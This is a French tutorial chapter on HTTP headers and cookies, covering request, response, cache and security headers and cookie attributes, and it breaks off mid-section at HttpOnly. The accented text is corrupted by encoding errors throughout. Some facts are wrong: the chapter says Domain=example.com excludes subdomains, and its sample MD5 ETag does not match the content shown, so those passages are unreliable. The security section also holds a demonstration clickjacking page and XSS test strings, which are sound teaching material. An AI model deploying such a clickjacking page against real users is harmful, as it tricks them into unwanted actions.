üîù Retour au [Sommaire](/SOMMAIRE.md)

# 5.4.3 Headers et Cookies HTTP

## Introduction

Les **headers HTTP** (en-t√™tes HTTP) et les **cookies** sont des m√©canismes fondamentaux qui enrichissent la communication HTTP de base. Alors que le corps d'une requ√™te ou d'une r√©ponse contient les donn√©es principales (HTML, JSON, images, etc.), les headers fournissent des **m√©tadonn√©es essentielles** sur la requ√™te, la r√©ponse, le contenu, et contr√¥lent divers aspects du comportement HTTP.

Les cookies, quant √† eux, permettent de contourner la nature "sans √©tat" (stateless) de HTTP en stockant des informations c√¥t√© client qui seront renvoy√©es au serveur √† chaque requ√™te.

**Ensemble, headers et cookies permettent :**
- L'authentification et les sessions utilisateur
- La mise en cache intelligente
- La n√©gociation de contenu
- La s√©curit√© renforc√©e
- Le contr√¥le de la compression
- Le suivi des performances
- Et bien plus encore...

## Structure des headers HTTP

### Format g√©n√©ral

Les headers HTTP sont des paires **cl√©: valeur** qui apparaissent apr√®s la ligne de d√©part (request line ou status line) et avant le corps du message.

```http
GET /api/users HTTP/1.1
Host: api.example.com                    ‚Üê Header
User-Agent: Mozilla/5.0                  ‚Üê Header
Accept: application/json                 ‚Üê Header
Authorization: Bearer abc123             ‚Üê Header
                                         ‚Üê Ligne vide (CRLF)
[Corps de la requ√™te, si pr√©sent]
```

### R√®gles syntaxiques

```
Nom-du-Header: valeur

R√®gles :
- Nom insensible √† la casse (Host = host = HOST)
- Valeur sensible √† la casse
- S√©parateur : deux-points suivi d'un espace
- Peut s'√©tendre sur plusieurs lignes (avec indentation)
```

**Exemple de header multi-lignes :**
```http
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
            AppleWebKit/537.36 (KHTML, like Gecko)
            Chrome/120.0.0.0 Safari/537.36
```

### Cat√©gories de headers

Les headers peuvent √™tre class√©s en plusieurs cat√©gories :

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  Headers de requ√™te   ‚îÇ Envoy√©s par le client   ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Headers de r√©ponse   ‚îÇ Envoy√©s par le serveur  ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Headers g√©n√©raux     ‚îÇ Applicables aux deux    ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Headers d'entit√©     ‚îÇ D√©crivent le corps      ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

## Headers de requ√™te essentiels

Ces headers sont envoy√©s **du client vers le serveur** avec chaque requ√™te.

### Host

**Le seul header obligatoire en HTTP/1.1.**

```http
Host: www.example.com
```

**Pourquoi obligatoire ?**
- Permet l'h√©bergement virtuel (plusieurs sites sur une m√™me IP)
- Le serveur utilise ce header pour savoir quel site servir

```
M√™me serveur (192.0.2.1) h√©berge :
Host: www.site1.com ‚Üí Sert le site 1
Host: www.site2.com ‚Üí Sert le site 2
Host: www.site3.com ‚Üí Sert le site 3
```

**Avec port personnalis√© :**
```http
Host: api.example.com:8080
```

### User-Agent

**Identifie le client** (navigateur, application, bot).

```http
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
```

**D√©composition :**
```
Mozilla/5.0               ‚Üí Compatibilit√© historique
Windows NT 10.0; Win64    ‚Üí Syst√®me d'exploitation
AppleWebKit/537.36        ‚Üí Moteur de rendu
Chrome/120.0.0.0          ‚Üí Navigateur et version
```

**Autres exemples :**
```http
# Mobile Safari
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15

# Application Python
User-Agent: python-requests/2.31.0

# Bot de recherche
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)

# Application personnalis√©e
User-Agent: MyApp/1.0 (contact@example.com)
```

**Utilit√© :**
- Statistiques et analytics
- Adaptation du contenu (desktop vs mobile)
- D√©tection des bots
- Debugging

### Accept

**Indique les types de contenu** que le client accepte.

```http
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
```

**D√©composition :**
```
text/html                ‚Üí Format pr√©f√©r√©
application/xhtml+xml    ‚Üí √âgalement accept√©
application/xml;q=0.9    ‚Üí Accept√© avec qualit√© 0.9
*/*;q=0.8                ‚Üí Tout autre format avec qualit√© 0.8
```

**Le param√®tre `q` (quality) :** Indique la pr√©f√©rence (0.0 √† 1.0, d√©faut 1.0)

**Exemples sp√©cifiques :**
```http
# API JSON uniquement
Accept: application/json

# Pr√©f√©rence pour JSON, accepte XML
Accept: application/json, application/xml;q=0.9

# Images
Accept: image/webp, image/png, image/*;q=0.8

# Tout accepter
Accept: */*
```

**N√©gociation de contenu :**
```http
Client ‚Üí Accept: application/json, application/xml;q=0.5

Serveur (a du JSON) ‚Üí
HTTP/1.1 200 OK
Content-Type: application/json

Serveur (n'a que XML) ‚Üí
HTTP/1.1 200 OK
Content-Type: application/xml

Serveur (n'a rien de compatible) ‚Üí
HTTP/1.1 406 Not Acceptable
```

### Accept-Language

**Langues pr√©f√©r√©es** de l'utilisateur.

```http
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
```

**Interpr√©tation :**
```
fr-FR    ‚Üí Fran√ßais (France) - pr√©f√©rence maximale
fr;q=0.9 ‚Üí Fran√ßais g√©n√©rique
en-US    ‚Üí Anglais (US)
en;q=0.7 ‚Üí Anglais g√©n√©rique
```

**Usage par le serveur :**
```javascript
// Exemple Node.js
app.get('/welcome', (req, res) => {
  const lang = req.acceptsLanguages(['fr', 'en', 'es']);

  if (lang === 'fr') {
    res.send('Bienvenue !');
  } else if (lang === 'en') {
    res.send('Welcome!');
  } else {
    res.send('Hello!'); // D√©faut
  }
});
```

### Accept-Encoding

**Encodages de compression** accept√©s par le client.

```http
Accept-Encoding: gzip, deflate, br
```

**Encodages courants :**
```
gzip    ‚Üí Compression GNU zip (tr√®s r√©pandu)
deflate ‚Üí Compression DEFLATE
br      ‚Üí Brotli (compression moderne, meilleure que gzip)
identity ‚Üí Pas de compression
```

**R√©ponse du serveur :**
```http
HTTP/1.1 200 OK
Content-Encoding: gzip
Content-Length: 1234

[donn√©es compress√©es en gzip]
```

**Gain typique :** 60-90% de r√©duction de taille pour du texte (HTML, CSS, JS, JSON)

### Authorization

**Informations d'authentification.**

```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Sch√©mas courants :**

**1. Basic Authentication**
```http
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                     ‚îî‚îÄ Base64(username:password)
```

**Exemple :**
```bash
# Encodage de "alice:secret123"
echo -n "alice:secret123" | base64
# R√©sultat : YWxpY2U6c2VjcmV0MTIz

# Requ√™te
curl -H "Authorization: Basic YWxpY2U6c2VjcmV0MTIz" \
     https://api.example.com/data
```

‚ö†Ô∏è **Attention :** Basic Auth envoie les credentials en clair (juste encod√© en Base64, pas chiffr√©). **Utilisez toujours HTTPS** avec Basic Auth.

**2. Bearer Token (JWT, OAuth)**
```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Usage typique :**
```javascript
// Obtenir le token
fetch('https://api.example.com/login', {
  method: 'POST',
  body: JSON.stringify({ username: 'alice', password: 'secret' })
})
.then(r => r.json())
.then(data => {
  const token = data.token;

  // Utiliser le token pour les requ√™tes suivantes
  fetch('https://api.example.com/protected', {
    headers: {
      'Authorization': `Bearer ${token}`
    }
  });
});
```

**3. API Key (custom)**
```http
Authorization: ApiKey abc123def456
X-API-Key: abc123def456
```

### Referer (oui, avec une faute d'orthographe!)

**URL de la page d'origine** qui a d√©clench√© la requ√™te.

```http
Referer: https://www.google.com/search?q=example
```

**Cas d'usage :**
```
1. Utilisateur sur Google cherche "tutoriel HTTP"
2. Clique sur un r√©sultat ‚Üí visite www.example.com/tutorial
3. La requ√™te inclut :
   Referer: https://www.google.com/search?q=tutoriel+HTTP
4. Le site sait d'o√π vient le visiteur
```

**Utilisations :**
- Analytics et statistiques
- Protection contre le hotlinking d'images
- D√©tection de sources de trafic

**Note historique :** L'orthographe correcte est "Referrer", mais la RFC originale a fait une faute qui est rest√©e dans le standard !

### Cookie

**Envoie les cookies** stock√©s pour ce domaine.

```http
Cookie: session_id=abc123; user_pref=dark_mode; lang=fr
```

Nous approfondirons les cookies dans une section d√©di√©e ci-dessous.

### If-Modified-Since

**Requ√™te conditionnelle** bas√©e sur la date de modification.

```http
If-Modified-Since: Thu, 05 Dec 2025 10:00:00 GMT
```

**Sc√©nario :**
```
1. Client t√©l√©charge /style.css
   Serveur r√©pond :
   HTTP/1.1 200 OK
   Last-Modified: Thu, 05 Dec 2025 10:00:00 GMT

2. Client met en cache avec la date

3. Client redemande /style.css :
   GET /style.css HTTP/1.1
   If-Modified-Since: Thu, 05 Dec 2025 10:00:00 GMT

4a. Si non modifi√© :
    HTTP/1.1 304 Not Modified
    (pas de body, √©conomie de bande passante)

4b. Si modifi√© :
    HTTP/1.1 200 OK
    Last-Modified: Sat, 06 Dec 2025 14:30:00 GMT
    [nouveau contenu]
```

### If-None-Match

**Requ√™te conditionnelle** bas√©e sur l'ETag.

```http
If-None-Match: "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

**Plus pr√©cis que If-Modified-Since** car l'ETag est un hash du contenu.

```
1. Client t√©l√©charge /data.json
   HTTP/1.1 200 OK
   ETag: "abc123"

2. Client redemande :
   GET /data.json
   If-None-Match: "abc123"

3. Si ETag identique :
   HTTP/1.1 304 Not Modified
```

### Range

**Demande une partie** du contenu.

```http
Range: bytes=0-1023
```

**Exemples :**
```http
Range: bytes=0-1023          ‚Üí Les 1024 premiers octets
Range: bytes=1024-2047       ‚Üí Les octets 1024 √† 2047
Range: bytes=1024-           ‚Üí Depuis l'octet 1024 jusqu'√† la fin
Range: bytes=-1024           ‚Üí Les 1024 derniers octets
Range: bytes=0-499,1000-1499 ‚Üí Deux plages
```

**R√©ponse :**
```http
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/104857600
Content-Length: 1024

[1024 octets de donn√©es]
```

**Cas d'usage :**
- Streaming vid√©o/audio (lecture √† partir d'un point sp√©cifique)
- Reprise de t√©l√©chargement interrompu
- T√©l√©chargement parall√®le (plusieurs plages simultan√©es)

## Headers de r√©ponse essentiels

Ces headers sont envoy√©s **du serveur vers le client** dans les r√©ponses.

### Content-Type

**Type MIME du contenu** de la r√©ponse.

```http
Content-Type: text/html; charset=utf-8
```

**Types courants :**
```http
# Pages web
Content-Type: text/html; charset=utf-8
Content-Type: text/css
Content-Type: application/javascript

# APIs
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded

# Images
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/webp
Content-Type: image/svg+xml

# Vid√©o et audio
Content-Type: video/mp4
Content-Type: audio/mpeg

# Documents
Content-Type: application/pdf
Content-Type: application/zip
Content-Type: text/plain

# Binaire g√©n√©rique
Content-Type: application/octet-stream
```

**Avec charset :**
```http
Content-Type: text/html; charset=utf-8
Content-Type: application/json; charset=utf-8
```

**Important :** Toujours sp√©cifier le charset pour √©viter les probl√®mes d'encodage.

### Content-Length

**Taille en octets** du corps de la r√©ponse.

```http
Content-Length: 1234
```

**Utilit√© :**
- Permet au client de savoir combien de donn√©es attendre
- N√©cessaire pour les connexions persistantes (HTTP/1.1)
- Permet d'afficher une barre de progression

**Sans Content-Length :**
```http
# Utilise Transfer-Encoding: chunked √† la place
HTTP/1.1 200 OK
Transfer-Encoding: chunked

5
Hello
0

```

### Content-Encoding

**Encodage de compression** appliqu√© au contenu.

```http
Content-Encoding: gzip
```

**Flux complet :**
```http
Client ‚Üí
Accept-Encoding: gzip, deflate, br

Serveur ‚Üí
HTTP/1.1 200 OK
Content-Encoding: gzip
Content-Type: text/html
Content-Length: 1234

[donn√©es compress√©es]
```

**Le navigateur d√©compresse automatiquement.**

### Set-Cookie

**Envoie un cookie** au client pour stockage.

```http
Set-Cookie: session_id=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
```

D√©taill√© dans la section cookies ci-dessous.

### Location

**URL de redirection** ou de la ressource cr√©√©e.

```http
HTTP/1.1 301 Moved Permanently
Location: https://www.example.com/new-url
```

**Avec cr√©ation de ressource :**
```http
HTTP/1.1 201 Created
Location: /api/users/124
Content-Type: application/json

{
  "id": 124,
  "name": "Bob"
}
```

### Last-Modified

**Date de derni√®re modification** de la ressource.

```http
Last-Modified: Thu, 05 Dec 2025 10:30:00 GMT
```

**Utilis√© avec :**
```http
Client ‚Üí If-Modified-Since: Thu, 05 Dec 2025 10:30:00 GMT
Serveur ‚Üí 304 Not Modified (si pas chang√©)
```

### ETag

**Identifiant unique** de la version de la ressource.

```http
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

**Types d'ETag :**
```http
# Strong ETag (exactitude au byte pr√®s)
ETag: "abc123"

# Weak ETag (√©quivalence s√©mantique)
ETag: W/"abc123"
```

**G√©n√©ration d'ETag :**
```python
import hashlib

def generate_etag(content):
    return hashlib.md5(content.encode()).hexdigest()

# Exemple
content = '{"id": 123, "name": "Alice"}'
etag = generate_etag(content)
# ETag: "e10adc3949ba59abbe56e057f20f883e"
```

**Utilisation :**
```http
# 1√®re requ√™te
GET /api/data
‚Üí HTTP/1.1 200 OK
  ETag: "abc123"
  {"data": "..."}

# 2√®me requ√™te
GET /api/data
If-None-Match: "abc123"
‚Üí HTTP/1.1 304 Not Modified (√©conomie)

# Si le contenu change
GET /api/data
If-None-Match: "abc123"
‚Üí HTTP/1.1 200 OK
  ETag: "xyz789"
  {"data": "... nouveau contenu ..."}
```

### Server

**Identifie le logiciel serveur.**

```http
Server: nginx/1.18.0
```

**Exemples :**
```http
Server: Apache/2.4.41 (Ubuntu)
Server: nginx/1.18.0
Server: Microsoft-IIS/10.0
Server: cloudflare
```

**S√©curit√© :** Certains administrateurs cachent ou minimisent cette information pour des raisons de s√©curit√©.

```http
# Version compl√®te (peut r√©v√©ler des vuln√©rabilit√©s)
Server: Apache/2.4.41 (Ubuntu) OpenSSL/1.1.1

# Version minimale
Server: Apache

# Compl√®tement cach√©
(header absent)
```

### Allow

**M√©thodes HTTP autoris√©es** pour cette ressource.

```http
HTTP/1.1 405 Method Not Allowed
Allow: GET, PUT, DELETE, HEAD, OPTIONS
```

### Retry-After

**D√©lai avant de r√©essayer** (avec 429 ou 503).

```http
HTTP/1.1 503 Service Unavailable
Retry-After: 3600

# Ou avec une date
HTTP/1.1 503 Service Unavailable
Retry-After: Sat, 06 Dec 2025 16:00:00 GMT
```

## Headers de cache

Le cache HTTP est un m√©canisme crucial pour les performances web.

### Cache-Control

**Le header moderne de contr√¥le du cache.**

```http
Cache-Control: public, max-age=3600
```

**Directives principales :**

```http
# Dur√©e de cache
Cache-Control: max-age=3600        ‚Üí Cache 1 heure
Cache-Control: max-age=86400       ‚Üí Cache 24 heures
Cache-Control: max-age=31536000    ‚Üí Cache 1 an

# Visibilit√©
Cache-Control: public              ‚Üí Cachable par tous (CDN, proxies, navigateur)
Cache-Control: private             ‚Üí Cachable uniquement par le navigateur
Cache-Control: no-cache            ‚Üí Doit revalider avant d'utiliser le cache
Cache-Control: no-store            ‚Üí Ne pas mettre en cache du tout

# Revalidation
Cache-Control: must-revalidate     ‚Üí Doit revalider si expir√©
Cache-Control: proxy-revalidate    ‚Üí Les proxies doivent revalider

# Combinaisons
Cache-Control: public, max-age=3600, must-revalidate
Cache-Control: private, no-cache
Cache-Control: no-store, no-cache, must-revalidate
```

**Exemples par type de contenu :**

```http
# Images statiques (1 an)
Cache-Control: public, max-age=31536000, immutable

# CSS/JS avec versioning
Cache-Control: public, max-age=31536000, immutable

# HTML (pas de cache ou courte dur√©e)
Cache-Control: no-cache
# ou
Cache-Control: public, max-age=300, must-revalidate

# API donn√©es sensibles
Cache-Control: private, no-cache, no-store, must-revalidate

# API donn√©es publiques
Cache-Control: public, max-age=60
```

**Directive `immutable` :**
```http
Cache-Control: public, max-age=31536000, immutable
```
Indique que la ressource ne changera **jamais** (utile avec le cache busting par versioning).

```html
<!-- Les fichiers avec hash ne changent jamais -->
<link rel="stylesheet" href="/css/style.abc123.css">
<script src="/js/app.def456.js"></script>
```

### Expires

**Date d'expiration du cache** (ancienne m√©thode, remplac√©e par Cache-Control).

```http
Expires: Sat, 06 Dec 2025 16:00:00 GMT
```

**Probl√®me :** D√©pend de l'horloge du client (peut √™tre incorrecte).

**Pr√©f√©rez Cache-Control: max-age** qui utilise une dur√©e relative.

### Pragma

**Header HTTP/1.0 pour la compatibilit√©.**

```http
Pragma: no-cache
```

**√âquivalent moderne :**
```http
Cache-Control: no-cache
```

**Pour une compatibilit√© maximale :**
```http
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
```

## Headers de s√©curit√©

Ces headers am√©liorent la s√©curit√© de votre application web.

### Strict-Transport-Security (HSTS)

**Force l'utilisation de HTTPS.**

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Directives :**
```
max-age=31536000    ‚Üí HTTPS obligatoire pendant 1 an
includeSubDomains   ‚Üí Applique aussi aux sous-domaines
preload             ‚Üí Inscription sur la liste de pr√©chargement des navigateurs
```

**Effet :**
```
1. Utilisateur visite https://example.com
2. Re√ßoit le header HSTS
3. Pendant 1 an, le navigateur :
   - Refuse http://example.com
   - Convertit automatiquement http:// en https://
   - Refuse les certificats invalides (pas de bypass)
```

### X-Content-Type-Options

**Emp√™che le MIME sniffing.**

```http
X-Content-Type-Options: nosniff
```

**Probl√®me sans ce header :**
```
Serveur d√©clare : Content-Type: text/plain
Fichier contient : <script>alert('XSS')</script>
Navigateur d√©tecte : "Ceci ressemble √† du JavaScript"
‚Üí Ex√©cute le script ! (vuln√©rabilit√©)
```

**Avec nosniff :**
```
Serveur d√©clare : Content-Type: text/plain
Navigateur : "Je respecte strictement le Content-Type"
‚Üí Traite comme du texte, pas de script
```

### X-Frame-Options

**Prot√®ge contre le clickjacking.**

```http
X-Frame-Options: DENY
```

**Options :**
```http
X-Frame-Options: DENY                    ‚Üí Jamais dans une iframe
X-Frame-Options: SAMEORIGIN              ‚Üí Iframe uniquement sur le m√™me domaine
X-Frame-Options: ALLOW-FROM https://... ‚Üí (d√©pr√©ci√©, utilisez CSP)
```

**Attaque clickjacking :**
```html
<!-- Site malveillant -->
<iframe src="https://bank.com/transfer"
        style="opacity: 0; position: absolute; top: 0;">
</iframe>
<button style="position: absolute; top: 100px;">
  Cliquez pour gagner 1000‚Ç¨ !
</button>

<!-- L'utilisateur clique sur le bouton visible,
     mais clique en r√©alit√© sur le bouton "Transf√©rer" invisible -->
```

**Protection :**
```http
# Le site de la banque
X-Frame-Options: DENY
‚Üí Impossible de charger dans une iframe
```

### Content-Security-Policy (CSP)

**Politique de s√©curit√© du contenu** (tr√®s puissant mais complexe).

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src *
```

**Directives courantes :**

```http
# Tout vient du m√™me domaine
Content-Security-Policy: default-src 'self'

# Scripts uniquement depuis le site et un CDN
Content-Security-Policy: script-src 'self' https://cdn.example.com

# Pas de JavaScript inline
Content-Security-Policy: script-src 'self'
‚Üí Bloque <script>alert('XSS')</script>
‚Üí Bloque <button onclick="...">

# Images de n'importe o√π
Content-Security-Policy: img-src *

# Combinaison compl√®te
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com 'nonce-abc123';
  style-src 'self' 'unsafe-inline';
  img-src * data:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none'
```

**Exemple avec nonce pour scripts inline :**
```http
Content-Security-Policy: script-src 'self' 'nonce-abc123'
```

```html
<!-- Autoris√© avec le bon nonce -->
<script nonce="abc123">
  console.log('This is allowed');
</script>

<!-- Bloqu√© (pas de nonce) -->
<script>
  console.log('This is blocked');
</script>
```

### X-XSS-Protection

**Protection XSS du navigateur** (d√©pr√©ci√©, remplac√© par CSP).

```http
X-XSS-Protection: 1; mode=block
```

**Options :**
```http
X-XSS-Protection: 0              ‚Üí D√©sactive la protection
X-XSS-Protection: 1              ‚Üí Active la protection (nettoie)
X-XSS-Protection: 1; mode=block  ‚Üí Bloque la page enti√®re
```

**Note :** Ce header est d√©pr√©ci√© car il peut introduire des vuln√©rabilit√©s. Pr√©f√©rez Content-Security-Policy.

### Referrer-Policy

**Contr√¥le les informations de referer envoy√©es.**

```http
Referrer-Policy: strict-origin-when-cross-origin
```

**Politiques :**
```http
Referrer-Policy: no-referrer
‚Üí Jamais de Referer

Referrer-Policy: no-referrer-when-downgrade
‚Üí Referer sauf HTTPS ‚Üí HTTP

Referrer-Policy: origin
‚Üí Envoie uniquement l'origine (https://example.com, pas l'URL compl√®te)

Referrer-Policy: origin-when-cross-origin
‚Üí URL compl√®te pour same-origin, origine pour cross-origin

Referrer-Policy: same-origin
‚Üí Referer uniquement pour same-origin

Referrer-Policy: strict-origin
‚Üí Origine, sauf HTTPS ‚Üí HTTP

Referrer-Policy: strict-origin-when-cross-origin (recommand√©)
‚Üí URL compl√®te same-origin, origine cross-origin, rien si HTTPS ‚Üí HTTP

Referrer-Policy: unsafe-url
‚Üí Toujours l'URL compl√®te (risqu√©)
```

**Exemple :**
```http
Referrer-Policy: strict-origin-when-cross-origin

Navigation sur example.com/page1 ‚Üí example.com/page2
‚Üí Referer: https://example.com/page1

Navigation example.com ‚Üí other.com
‚Üí Referer: https://example.com

Navigation https://example.com ‚Üí http://other.com
‚Üí Pas de Referer (downgrade)
```

### Permissions-Policy

**Contr√¥le l'acc√®s aux APIs du navigateur** (anciennement Feature-Policy).

```http
Permissions-Policy: geolocation=(), microphone=(), camera=(self)
```

**Exemples :**
```http
# D√©sactiver la g√©olocalisation
Permissions-Policy: geolocation=()

# Cam√©ra uniquement sur le domaine actuel
Permissions-Policy: camera=(self)

# Microphone pour le site et un domaine sp√©cifique
Permissions-Policy: microphone=(self "https://trusted.com")

# Politique multiple
Permissions-Policy:
  geolocation=(self),
  microphone=(),
  camera=(self),
  payment=(self "https://payment-provider.com")
```

**APIs contr√¥lables :**
- `geolocation` : G√©olocalisation
- `microphone` : Microphone
- `camera` : Cam√©ra
- `payment` : API Payment Request
- `usb` : Acc√®s USB
- `midi` : API Web MIDI
- `accelerometer`, `gyroscope` : Capteurs
- Et bien d'autres...

## Les Cookies HTTP

### Introduction aux cookies

Les **cookies** sont de petits fichiers texte stock√©s par le navigateur et renvoy√©s automatiquement au serveur avec chaque requ√™te. Ils permettent de maintenir un √©tat entre les requ√™tes HTTP.

### Cr√©ation d'un cookie

**Le serveur cr√©e un cookie avec `Set-Cookie` :**

```http
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123
Set-Cookie: user_pref=dark_mode; Max-Age=2592000
Content-Type: text/html

<!DOCTYPE html>...
```

**Le navigateur stocke les cookies et les renvoie :**

```http
GET /profile HTTP/1.1
Host: example.com
Cookie: session_id=abc123; user_pref=dark_mode
```

### Anatomie d'un cookie

```http
Set-Cookie: name=value; Domain=example.com; Path=/; Max-Age=3600; Secure; HttpOnly; SameSite=Lax
            ‚îÇ    ‚îÇ      ‚îÇ                    ‚îÇ      ‚îÇ            ‚îÇ       ‚îÇ         ‚îÇ
            ‚îÇ    ‚îÇ      ‚îÇ                    ‚îÇ      ‚îÇ            ‚îÇ       ‚îÇ         ‚îî‚îÄ Protection CSRF
            ‚îÇ    ‚îÇ      ‚îÇ                    ‚îÇ      ‚îÇ            ‚îÇ       ‚îî‚îÄ Protection XSS
            ‚îÇ    ‚îÇ      ‚îÇ                    ‚îÇ      ‚îÇ            ‚îî‚îÄ HTTPS uniquement
            ‚îÇ    ‚îÇ      ‚îÇ                    ‚îÇ      ‚îî‚îÄ Dur√©e de vie (secondes)
            ‚îÇ    ‚îÇ      ‚îÇ                    ‚îî‚îÄ Chemin applicable
            ‚îÇ    ‚îÇ      ‚îî‚îÄ Domaine applicable
            ‚îÇ    ‚îî‚îÄ Valeur du cookie
            ‚îî‚îÄ Nom du cookie
```

### Attributs des cookies

#### Max-Age et Expires

**Dur√©e de vie du cookie.**

```http
# Max-Age (dur√©e en secondes, moderne)
Set-Cookie: token=abc123; Max-Age=3600
‚Üí Expire dans 1 heure

# Expires (date absolue, ancien)
Set-Cookie: token=abc123; Expires=Sat, 06 Dec 2025 16:00:00 GMT

# Session cookie (pas d'expiration)
Set-Cookie: temp=value
‚Üí Supprim√© √† la fermeture du navigateur
```

**Dur√©es courantes :**
```http
1 heure   : Max-Age=3600
1 jour    : Max-Age=86400
1 semaine : Max-Age=604800
1 mois    : Max-Age=2592000
1 an      : Max-Age=31536000
```

#### Domain

**Domaine(s) pour lesquels le cookie est valide.**

```http
# Cookie pour example.com uniquement
Set-Cookie: data=value; Domain=example.com

# Cookie pour example.com et TOUS ses sous-domaines
Set-Cookie: data=value; Domain=.example.com
‚Üí Valide pour www.example.com, api.example.com, etc.

# Sans Domain (d√©faut)
Set-Cookie: data=value
‚Üí Valide uniquement pour le domaine actuel (sans sous-domaines)
```

**Exemple :**
```
Site : www.example.com

Set-Cookie: a=1; Domain=www.example.com
‚Üí Envoy√© √† www.example.com
‚Üí PAS envoy√© √† api.example.com

Set-Cookie: b=2; Domain=.example.com
‚Üí Envoy√© √† www.example.com
‚Üí Envoy√© √† api.example.com
‚Üí Envoy√© √† tout.sous-domaine.example.com
```

#### Path

**Chemin pour lequel le cookie est valide.**

```http
# Cookie pour toutes les pages
Set-Cookie: data=value; Path=/

# Cookie uniquement pour /admin et sous-chemins
Set-Cookie: admin_token=xyz; Path=/admin

# Cookie pour /api
Set-Cookie: api_key=abc; Path=/api
```

**Exemple :**
```
Set-Cookie: session=abc123; Path=/admin

GET /admin          ‚Üí Cookie envoy√© ‚úÖ
GET /admin/users    ‚Üí Cookie envoy√© ‚úÖ
GET /profile        ‚Üí Cookie PAS envoy√© ‚ùå
GET /api/data       ‚Üí Cookie PAS envoy√© ‚ùå
```

#### Secure

**Cookie envoy√© uniquement sur HTTPS.**

```http
Set-Cookie: token=abc123; Secure
```

**Sans Secure :**
```
HTTP  : Cookie envoy√© ‚úÖ
HTTPS : Cookie envoy√© ‚úÖ
```

**Avec Secure :**
```
HTTP  : Cookie PAS envoy√© ‚ùå
HTTPS : Cookie envoy√© ‚úÖ
```

**‚ö†Ô∏è Utilisez toujours `Secure` pour les cookies sensibles** (tokens, identifiants de session).

#### HttpOnly

**Cookie inaccessible via JavaScript** (protection XSS).

```http
Set-Cookie: session_id=abc123; HttpOnly
```

**Sans HttpOnly :**
